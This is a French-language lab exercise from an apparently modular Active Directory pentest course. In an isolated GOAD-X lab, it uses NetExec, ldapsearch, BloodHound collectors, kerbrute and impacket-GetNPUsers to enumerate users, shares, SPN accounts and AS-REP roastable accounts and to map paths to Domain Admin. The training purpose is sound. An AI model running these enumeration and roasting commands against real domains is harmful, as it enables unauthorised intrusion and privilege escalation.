# Build — Cartographier GOAD-X (lab isolé)

## Pré-requis
- GOAD-X + poste attaquant (module 50). Un credential (assumed breach), ex. un user de GOAD.

## Étape 1 — Énumération rapide (NetExec)
```bash
nxc smb 10.10.0.10 -u user -p 'pass' --users
nxc smb 10.10.0.10 -u user -p 'pass' --groups
nxc smb 10.10.0.10 -u user -p 'pass' --pass-pol
nxc smb 10.10.0.0/24 -u user -p 'pass' --shares
```

## Étape 2 — Énumération LDAP ciblée
```bash
# comptes à SPN, sans pré-auth, délégations (voir module 15)
ldapsearch -x -H ldap://10.10.0.10 -D 'user@dom' -w 'pass' -b 'DC=...' '(servicePrincipalName=*)' sAMAccountName
```

## Étape 3 — Collecte BloodHound
```bash
# Collector Python (BloodHound CE)
bloodhound-python -u user -p 'pass' -d corp.meridian.com -ns 10.10.0.10 -c All --zip
# ou SharpHound.exe -c All  (sur une VM Windows du lab)
```
Importer le zip dans BloodHound, lancer les requêtes **Shortest paths to Domain Admins**, repérer les
edges exploitables (ACL, délégations, sessions).

## Étape 4 — Énumération Kerberos (users / no-preauth)
```bash
kerbrute userenum -d corp.meridian.com --dc 10.10.0.10 users.txt
# comptes AS-REP roastables (module 52) :
impacket-GetNPUsers corp.meridian.com/ -usersfile users.txt -no-pass -dc-ip 10.10.0.10
```

## Étape 5 — Consigner
Ajouter chaque trouvaille au `journal.md` (module 50) : cibles SPN, chemins BloodHound, ACL abusables.

## Vérification
- Tu as une liste priorisée de vecteurs (SPN, ACL, délégations, ESC) et au moins un chemin BloodHound
  vers un compte à privilèges.

## Pièges courants
- Collecte trop bruyante (tout en une fois) → pour l'OPSEC, cibler ; mais en lab, c'est OK.
- Horloge désynchronisée (Kerberos).
